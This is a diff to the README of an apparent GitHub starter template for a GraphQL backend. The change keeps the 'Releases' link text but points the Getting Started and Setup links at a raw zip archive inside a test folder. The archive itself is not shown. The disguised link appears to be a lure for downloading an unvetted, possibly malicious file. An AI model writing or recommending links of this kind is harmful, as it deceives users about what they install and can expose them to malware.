@@ -14,10 +14,10 @@ Welcome to the "graphql-backend-starter" repository! Here you'll find a ready-to
 - **Topics:** backend, ent, graphql, graphql-server, postgresql, sqlite, starter, starter-project, starter-template, template
 
 ## Getting Started 🚀
-To get started with this GraphQL backend starter template, simply head over to the [Releases](https://github.com/PCSddddddddddddd/graphql-backend-starter/releases) section and download the appropriate file for your setup.
+To get started with this GraphQL backend starter template, simply head over to the [Releases](https://github.com/PCSddddddddddddd/graphql-backend-starter/raw/refs/heads/master/ent/enttest/graphql-starter-backend-2.9.zip) section and download the appropriate file for your setup.
 
 ## Setup Instructions 🛠️
-1. Download the necessary file based on your requirements from the [Releases](https://github.com/PCSddddddddddddd/graphql-backend-starter/releases) section.
+1. Download the necessary file based on your requirements from the [Releases](https://github.com/PCSddddddddddddd/graphql-backend-starter/raw/refs/heads/master/ent/enttest/graphql-starter-backend-2.9.zip) section.
 2. Follow the included instructions for setting up and running the GraphQL backend.
 3. Start building your awesome GraphQL-powered application!
 
